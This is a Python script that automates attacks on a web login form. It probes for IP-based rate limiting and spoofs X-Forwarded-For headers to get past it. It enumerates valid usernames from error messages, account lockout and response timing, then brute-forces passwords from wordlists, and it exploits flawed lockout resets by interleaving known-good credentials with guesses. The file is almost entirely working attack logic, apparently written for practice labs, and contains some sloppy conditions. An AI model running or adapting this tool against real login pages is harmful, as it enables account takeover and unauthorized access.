import time
import requests
import scanner
import urllib.parse as urlparse
from bs4 import BeautifulSoup
from time import perf_counter
import re

login_url = ""
username="";password="";i=50
error_msg="";headers={}

# To check for ip block mechanism
def ip_block():
    for i in range(0, 6):
        post = submit_form()
    if "too many" in str(post.content):
        print(error_msg)
        choice = input("Do you want add X-forwaded header?(yes/no)")
        if choice == "yes":
            x_forweded_for()
    else:
        print("No IP BLOCK !!!!")

def x_forweded_for():
    global i,headers
    headers = {'X-Forwarded-For': str(i)}
    i=i+1

def extract_forms(url):
    response = requests.get(url)
    parsed_html = BeautifulSoup(response.content, "lxml")
    return parsed_html.find("form")

def submit_form(usr_value="administrator",pass_value="ghjghgbkbbhk"):
    global error_msg
    form = extract_forms(login_url)
    action = form.get("action")
    post_url = urlparse.urljoin(login_url, action)
    post_data1 = {}
    inputs_list1 = form.find_all("input")
    for input in inputs_list1:
        input_name = input.get("name")
        input_type = input.get("type")
        input_value = input.get("value")
        if input_type == "username":
            input_value = usr_value
        elif input_type == "password":
            input_value = pass_value
        post_data1[input_name] = input_value
    if len(headers)!=0 :
        x_forweded_for()
    post1 = requests.post(post_url, data=post_data1, headers=headers)
    try:
     error_msg=re.findall('(?:<p class=is-warning>)(.*?)</p>',str(post1.content))[0]
    except :
        error_msg=""
    return post1

def username_enumeration():
    global username, password
    post1=submit_form()
    if "Invalid username" or "Invalid password" in post1.content:
        print("Username enumeration through differnt responses!!!!")
        print("Dictionary attack is possible!!")
    with open("username.txt") as wordlist_file :
        for line in wordlist_file :
            word = line.strip()
            post=submit_form(word)
            print("Checking valid username :" + word,end="\r")
            if "Incorrect password" in str(post.content):
                print("Valid Username : "+word)
                username = word
                break
    with open("password.txt") as wordlist_file:
        for line in wordlist_file:
            word = line.strip()
            post = submit_form(username,word)
            if "Incorrect password" not in str(post.content):
                print("Password : " + word)
                password = word
                break
def username_subtly():
    global username,password
    error_message = error_msg
    with open("username.txt") as wordlist_file :
        for line in wordlist_file :
            word = line.strip()
            post=submit_form(word)
            print("Checking valid username :" + word,end="\r")
            if error_message not in str(post.content):
                print("Valid Username : "+word)
                username = word
                break
    if username != "":
        with open("password.txt") as wordlist_file:
            for line in wordlist_file:
                word = line.strip()
                post = submit_form(username,word)
                if "Invalid" not in str(post.content):
                    print("Password : " + word)
                    password = word
                    break
def username_timing():
    global username, password
    response_time ={}
    password = ["password"]*50

    with open("username.txt") as wordlist_file:
        for line in wordlist_file:
            word = line.strip()
            counter_start = perf_counter()
            post = submit_form(word, ''.join(password))
            counter_stop = perf_counter()
            response_time[word] = counter_stop-counter_start
            print(word+"\t\t"+str(response_time[word]))
        max_value = max(zip(response_time.values(), response_time.keys()))[1]
        username = max_value
        if response_time[max_value] >= 2 :
         print("Valid Username: " + max_value)
        else:
            print("Not vulnerable to Username enumeration via response timing")
    if username !="":
        with open("password.txt") as wordlist_file:
            for line in wordlist_file:
                word = line.strip()
                post = submit_form(username,word)
                if "Invalid" not in str(post.content):
                    print("Password : " + word)
                    password = word
                    break

def flawed_bruteforce():
    correct_username = input("Enter the correct username:")
    correct_password = input("Enter the correct password of username" + correct_username + ":")
    victim_username = input("Enter the victim username:")
    username_list = []; password_list = []

    with open("password.txt") as wordlist_file:
        for line in wordlist_file:
            word = line.strip()
            password_list.append(correct_password)
            password_list.append(word)
    for i in range(0, len(password_list)):
        username_list.append(correct_username)
        username_list.append(victim_username)
    for i in range(0, len(password_list)):
        post = submit_form(username_list[i], password_list[i])
        print(username_list[i]+"\t\t"+password_list[i] )
        if username_list[i] != correct_username:
            if "Incorrect password" not in str(post.content):
                print("Correct password for " + username_list[i] + "username : " + password_list[i])
                break
            elif error_msg in str(post.content):
                print("number of failed login attempts cannot be reset")
                break

# To check for account lock mechanism
def account_lock():
    global username, password
    username_list = [];password_list = []
    with open("username.txt") as wordlist_file:
        for line in wordlist_file:
            word = line.strip()
            username_list.append(word)
    with open("password.txt") as wordlist_file:
        for line in wordlist_file:
            word = line.strip()
            password_list.append(word)
    for i in range(0,len(username_list)):
         for k in range(0,5):
           post= submit_form(username_list[i])
         if "too many" in str(post.content):
               print("Valid Username : "+username_list[i])
               username = username_list[i]
               break
    for i in range(0,len(password_list))  :
         post = submit_form("alaska", password_list[i])
         if "too many" not in str(post.content) and "Invalid" not in str(post.content):
             print("Password for "+username+" username : "+password_list[i])
             password=password_list[i]
             break
def main():
    global login_url
    login_url = input("Enter the login url :")
    p=submit_form()
    print("Error Message: "+error_msg)
    ip_block()
    p = submit_form()
    if "too many" in str(p.content):
        print("IP Block cannot be bypassed by adding x forweded header!!!!")
        headers={}
        print("Checking number of failed login attempts can be reset by providing correct credentials!!!!")
        print(error_msg)
        t=int(input("Enter number of seconds to sleep the program : "))
        time.sleep(t)
        flawed_bruteforce()
    else:
        print("IP Block is bypassed !!!!")
    if error_msg=="Invalid username" :
        username_enumeration()
    if "username" in error_msg and "password" in error_msg :
        print("Not Vulnerable to username enumeration via different responces!!!")
        username_subtly()
        if username =="" or password =="" :
            print("Not Vulnerable to username enumeration via subtly different responces!!!")
            account_lock()
            if username == "" or password == "":
                print("Not Vulnerable to username enumeration via account lock!!!")
                username_timing()
                if username == "" :
                    print("Not Vulnerable to username enumeration via responce timing!!!")
if __name__ == '__main__':
    main()
